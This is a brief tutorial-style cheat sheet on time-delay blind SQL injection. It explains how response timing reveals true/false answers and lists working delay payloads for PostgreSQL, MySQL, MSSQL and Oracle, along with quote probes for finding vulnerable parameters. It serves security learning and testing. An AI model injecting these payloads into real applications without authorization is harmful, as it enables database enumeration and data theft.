
## Time Delay Based SQLi

- In time-delay based SQL injection, we cannot see any results or error messages from the application. So instead, we rely on how long the database takes to respond. By crafting payloads that introduce a delay when a condition is **true**, and no delay when it is **false**, we can infer information based on the response time. This allows us to perform enumeration by asking true/false questions and observing whether the server response is delayed or not.

### 1. Check Parameter Vulnerability

```sql
'
''
/*
find out which parameter is vulnerable to SQLi first.
Insert each payload above to look for database response variation.
The paramter can be a trackingID, sessionID etc...
*/
```

### 2. Testing Entries

```sql
-- PostgreSQL
'||pg_sleep(10)--

-- MySQL / MariaDB
' OR SLEEP(10)#

-- Microsoft SQL Server (MSSQL)
'; WAITFOR DELAY '0:0:10'--

-- Oracle
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('ADS', 10)--


/*
since blind sqli don't return visible results so
the payloads are designed to ask true/false questions using time delay and 
based on that we can perform database enumeration.
In the above payloads 10 means 10 seconds.
*/
```